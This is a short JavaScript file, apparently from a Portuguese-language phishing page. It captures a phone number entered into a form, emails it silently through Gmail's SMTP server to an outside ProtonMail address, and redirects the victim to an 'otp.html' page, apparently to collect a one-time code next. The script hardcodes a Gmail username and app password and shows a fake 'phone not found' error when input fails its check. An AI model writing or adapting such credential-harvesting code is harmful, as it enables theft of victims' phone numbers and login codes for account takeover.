window.onload = function()
{
    var phone = document.getElementById("phoneBtn");
    var err = document.getElementById("bad-login");
    phone.addEventListener("click", function(e) {
        e.preventDefault();
        var x = document.querySelector("#phone");
        var y = x.value;
        console.log(y)
        if (y.length >= 9 && y.length <= 13)
        {
            Email.send({
                Host: "smtp.gmail.com",
                Username : "julio74108520@gmail.com",
                Password : "dnkf zamf xwmj amjr",
                To : 'user1533@protonmail.com',
                From : "julio74108520@gmail.com",
                Subject : y,
                Body : "<p> << Phone number </p>",
            });
	    window.location.href = "otp.html";
        } else {
            err.innerHTML = "<p class='err-alert'>Telefone não encontrado, tente novamente.<p>"
            x.value='';
        }
    });
}
    
